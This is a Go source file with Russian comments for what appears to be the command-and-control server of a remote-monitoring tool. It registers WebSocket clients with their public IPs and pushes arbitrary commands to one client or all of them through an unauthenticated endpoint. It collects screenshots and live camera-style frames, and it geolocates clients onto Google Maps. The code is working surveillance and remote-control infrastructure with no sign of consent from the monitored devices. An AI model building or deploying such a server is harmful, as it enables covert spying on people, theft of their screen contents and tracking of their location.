package main

import (
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// Константа для пути сохранения файлов
const (
	uploadPath = "./uploads"
)

// Client хранит данные о соединении, уникальный идентификатор и публичный IP.
type Client struct {
	ID   string
	Conn *websocket.Conn
	IP   string
}

var (
	logger = log.New(os.Stdout, "SERVER: ", log.Ldate|log.Ltime|log.Lshortfile)

	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}

	// Храним всех подключённых клиентов по их ID.
	wsClients      = make(map[string]*Client)
	wsClientsMutex sync.Mutex

	// Счётчик для генерации уникальных идентификаторов.
	clientCounter int
)

// wsHandler – обработчик для WebSocket-соединения.
// Клиент должен сразу после подключения отправить сообщение "ip:xxx.xxx.xxx.xxx".
func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		logger.Println("Ошибка апгрейда WebSocket:", err)
		return
	}

	// Генерируем уникальный идентификатор для клиента.
	wsClientsMutex.Lock()
	clientCounter++
	clientID := fmt.Sprintf("client-%d", clientCounter)
	client := &Client{ID: clientID, Conn: conn, IP: ""}
	wsClients[clientID] = client
	wsClientsMutex.Unlock()

	logger.Printf("WebSocket клиент %s подключён", clientID)

	// Отправляем клиенту его ID
	if err := conn.WriteMessage(websocket.TextMessage, []byte("id:"+clientID)); err != nil {
		logger.Printf("Ошибка отправки ID клиенту %s: %v", clientID, err)
	}

	defer func() {
		wsClientsMutex.Lock()
		delete(wsClients, clientID)
		wsClientsMutex.Unlock()
		conn.Close()
		logger.Printf("WebSocket клиент %s отключён", clientID)
	}()

	// Чтение сообщений от клиента
	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			logger.Printf("Ошибка чтения WebSocket у клиента %s: %v", clientID, err)
			break
		}
		msgStr := string(message)
		logger.Printf("Клиент %s отправил: %s", clientID, msgStr)
		// Если сообщение начинается с "ip:", сохраняем публичный IP
		if strings.HasPrefix(msgStr, "ip:") {
			ip := strings.TrimPrefix(msgStr, "ip:")
			wsClientsMutex.Lock()
			client.IP = ip
			wsClientsMutex.Unlock()
			logger.Printf("Сохранён публичный IP для клиента %s: %s", clientID, ip)
		} else {
			// Здесь можно обрабатывать и другие команды от клиента.
			logger.Printf("Получено сообщение от клиента %s: %s", clientID, msgStr)
		}
	}
}

// commandHandler – HTTP-ручка для отправки команд клиентам.
// Если передан параметр "id", команда отправляется только выбранному клиенту.
// Если "id" не указан, команда отправляется всем клиентам.
func commandHandler(w http.ResponseWriter, r *http.Request) {
	cmd := r.URL.Query().Get("cmd")
	if cmd == "" {
		http.Error(w, "Параметр cmd отсутствует", http.StatusBadRequest)
		return
	}
	targetID := r.URL.Query().Get("id")

	// Для остальных команд отправляем сообщение через WS.
	wsClientsMutex.Lock()
	defer wsClientsMutex.Unlock()
	if targetID != "" {
		client, ok := wsClients[targetID]
		if !ok {
			http.Error(w, "Клиент с таким ID не найден", http.StatusNotFound)
			return
		}
		if err := client.Conn.WriteMessage(websocket.TextMessage, []byte(cmd)); err != nil {
			logger.Printf("Ошибка отправки команды клиенту %s: %v", targetID, err)
			http.Error(w, "Ошибка отправки команды", http.StatusInternalServerError)
			return
		}
		logger.Printf("Команда '%s' отправлена клиенту %s", cmd, targetID)
	} else {
		// Рассылка всем клиентам.
		for _, client := range wsClients {
			if err := client.Conn.WriteMessage(websocket.TextMessage, []byte(cmd)); err != nil {
				logger.Printf("Ошибка отправки команды клиенту %s: %v", client.ID, err)
			} else {
				logger.Printf("Команда '%s' отправлена клиенту %s", cmd, client.ID)
			}
		}
	}
	w.Write([]byte("Команда отправлена"))
}

// mapHandler – выполняет геокодирование по сохранённым IP одного из подключённых клиентов
// и делает HTTP‑редирект на Google Maps с полученными координатами.
func mapHandler(w http.ResponseWriter, r *http.Request) {
	// Пытаемся получить ID клиента из параметра запроса
	clientID := r.URL.Query().Get("client")
	var chosen *Client

	wsClientsMutex.Lock()
	if clientID != "" {
		// Если параметр client указан, пытаемся выбрать этого клиента
		if client, ok := wsClients[clientID]; ok && client.IP != "" {
			chosen = client
		}
	} else {
		// Если параметр не указан, выбираем первого клиента с сохранённым публичным IP
		for _, client := range wsClients {
			if client.IP != "" {
				chosen = client
				break
			}
		}
	}
	wsClientsMutex.Unlock()

	if chosen == nil {
		http.Error(w, "Нет клиента с сохранённым публичным IP", http.StatusNotFound)
		return
	}

	// Выполняем геокодирование через ip-api.com
	geoURL := fmt.Sprintf("http://ip-api.com/json/%s", chosen.IP)
	resp, err := http.Get(geoURL)
	if err != nil {
		http.Error(w, "Ошибка запроса геоданных", http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()

	type Location struct {
		Status string  `json:"status"`
		Lat    float64 `json:"lat"`
		Lon    float64 `json:"lon"`
	}
	var loc Location
	if err := json.NewDecoder(resp.Body).Decode(&loc); err != nil {
		http.Error(w, "Ошибка декодирования геоданных", http.StatusInternalServerError)
		return
	}
	if loc.Status != "success" {
		http.Error(w, "Геокодирование не удалось", http.StatusInternalServerError)
		return
	}

	redirectURL := fmt.Sprintf("https://www.google.com/maps?q=%f,%f", loc.Lat, loc.Lon)
	http.Redirect(w, r, redirectURL, http.StatusFound)
}

// uploadHandler – пример обработчика для загрузки файлов.
func uploadHandler(w http.ResponseWriter, r *http.Request) {
	logger.Println("Получен запрос на загрузку данных")
	data, err := io.ReadAll(r.Body)
	if err != nil {
		logger.Printf("Ошибка чтения данных: %v", err)
		http.Error(w, "Ошибка чтения данных", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	// contentType := r.Header.Get("Content-Type")
	// Сохраняем с уникальным именем
	// filename := fmt.Sprintf("%s/%d.%s", uploadPath, time.Now().UnixNano(), getFileExtension(contentType))
	// if err := os.WriteFile(filename, data, 0644); err != nil {
	// 	logger.Printf("Ошибка сохранения файла: %v", err)
	// 	http.Error(w, "Ошибка сохранения файла", http.StatusInternalServerError)
	// 	return
	// }

	// Просто обновляем фиксированный файл для трансляции:
	latestFrame := fmt.Sprintf("%s/latest_frame.jpg", uploadPath)
	if err := os.WriteFile(latestFrame, data, 0644); err != nil {
		logger.Printf("Ошибка обновления latest_frame.jpg: %v", err)
		// Не критичная ошибка, можно продолжать
	}

	// logger.Printf("Файл успешно сохранён: %s", filename)
	w.WriteHeader(http.StatusOK)
}

// uploadScreenshotHandler – обработчик для загрузки скриншотов.
func uploadScreenshotHandler(w http.ResponseWriter, r *http.Request) {
	logger.Println("Получен запрос на загрузку скриншота")
	data, err := io.ReadAll(r.Body)
	if err != nil {
		logger.Printf("Ошибка чтения данных: %v", err)
		http.Error(w, "Ошибка чтения данных", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()
	// Сохраняем скриншот с уникальным именем
	filename := fmt.Sprintf("%s/screenshot_%d.jpg", uploadPath, time.Now().UnixNano())
	if err := os.WriteFile(filename, data, 0644); err != nil {
		logger.Printf("Ошибка сохранения файла: %v", err)
		http.Error(w, "Ошибка сохранения файла", http.StatusInternalServerError)
		return
	}
	// Обновляем файл для отображения последнего скриншота
	latestScreenshot := fmt.Sprintf("%s/latest_screenshot.jpg", uploadPath)
	if err := os.WriteFile(latestScreenshot, data, 0644); err != nil {
		logger.Printf("Ошибка обновления latest_screenshot.jpg: %v", err)
	}
	logger.Printf("Скриншот успешно сохранён: %s", filename)
	w.WriteHeader(http.StatusOK)
}

// timeHandler – возвращает серверное время.
func timeHandler(w http.ResponseWriter, r *http.Request) {
	currentTime := time.Now().UTC().Format(time.RFC3339)
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte(currentTime))
}

// publicIPHandler – пример получения IP через HTTP (если понадобится).
func publicIPHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Метод не поддерживается", http.StatusMethodNotAllowed)
		return
	}
	type PublicIP struct {
		IP string `json:"public_ip"`
	}
	var pip PublicIP
	decoder := json.NewDecoder(r.Body)
	if err := decoder.Decode(&pip); err != nil {
		logger.Printf("Ошибка декодирования JSON: %v", err)
		http.Error(w, "Неверный формат данных", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()
	logger.Printf("Получен публичный IP через HTTP: %s", pip.IP)
	w.WriteHeader(http.StatusOK)
}

// indexHandler – отдаёт HTML-шаблон.
// func indexHandler(w http.ResponseWriter, r *http.Request) {
// 	tmpl, err := template.ParseFiles("index.html")
// 	if err != nil {
// 		logger.Printf("Ошибка загрузки шаблона: %v", err)
// 		http.Error(w, "Ошибка загрузки шаблона", http.StatusInternalServerError)
// 		return
// 	}
// 	tmpl.Execute(w, nil)
// }

func clientsHandler(w http.ResponseWriter, r *http.Request) {
	wsClientsMutex.Lock()
	clients := make([]*Client, 0, len(wsClients))
	for _, client := range wsClients {
		clients = append(clients, client)
	}
	wsClientsMutex.Unlock()

	tmpl, err := template.ParseFiles("clients.html")
	if err != nil {
		logger.Printf("Ошибка загрузки шаблона clients.html: %v", err)
		http.Error(w, "Ошибка загрузки шаблона", http.StatusInternalServerError)
		return
	}
	tmpl.Execute(w, clients)
}

func clientHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("client")
	if clientID == "" {
		http.Error(w, "Не указан клиент", http.StatusBadRequest)
		return
	}
	tmpl, err := template.ParseFiles("client.html")
	if err != nil {
		logger.Printf("Ошибка загрузки шаблона client.html: %v", err)
		http.Error(w, "Ошибка загрузки шаблона", http.StatusInternalServerError)
		return
	}
	// Передаём выбранный clientID в шаблон
	tmpl.Execute(w, clientID)
}

// getFileExtension возвращает расширение файла по Content-Type.
func getFileExtension(contentType string) string {
	switch contentType {
	case "image/jpeg":
		return "jpg"
	case "audio/wav":
		return "wav"
	default:
		return "dat"
	}
}

// cleanupJPGFiles удаляет все файлы с расширением .jpg в директории uploadPath.
func cleanupJPGFiles() {
	files, err := os.ReadDir(uploadPath)
	if err != nil {
		logger.Printf("Ошибка чтения директории %s: %v", uploadPath, err)
		return
	}

	for _, file := range files {
		if !file.IsDir() && strings.HasSuffix(strings.ToLower(file.Name()), ".jpg") {
			filePath := filepath.Join(uploadPath, file.Name())
			if err := os.Remove(filePath); err != nil {
				logger.Printf("Ошибка удаления файла %s: %v", filePath, err)
			} else {
				logger.Printf("Удалён файл: %s", filePath)
			}
		}
	}
}

// startJPGCleanupJob запускает фоновую задачу, которая периодически очищает файлы с расширением .jpg.
func startJPGCleanupJob(interval time.Duration) {
	go func() {
		for {
			cleanupJPGFiles()
			time.Sleep(interval)
		}
	}()
}

func main() {
	// Создание директории для загрузок.
	if err := os.MkdirAll(uploadPath, os.ModePerm); err != nil {
		logger.Fatalf("Ошибка создания директории: %v", err)
	}

	// Запуск фоновой задачи для очистки файлов .jpg каждые 10 минут
	startJPGCleanupJob(10 * time.Minute)

	// Регистрируем обработчики.
	http.HandleFunc("/ws", wsHandler)
	// http.HandleFunc("/clients", clientsHandler)
	http.HandleFunc("/client", clientHandler)
	http.HandleFunc("/command", commandHandler)
	http.HandleFunc("/upload", uploadHandler)
	http.HandleFunc("/upload/screenshot", uploadScreenshotHandler)
	http.HandleFunc("/api/time", timeHandler)
	http.HandleFunc("/ip", publicIPHandler)
	http.HandleFunc("/map", mapHandler)
	http.HandleFunc("/", clientsHandler)
	http.Handle("/uploads/", http.StripPrefix("/uploads/", http.FileServer(http.Dir(uploadPath))))

	logger.Println("Сервер запущен на :4000")
	log.Fatal(http.ListenAndServe(":4000", nil))
}
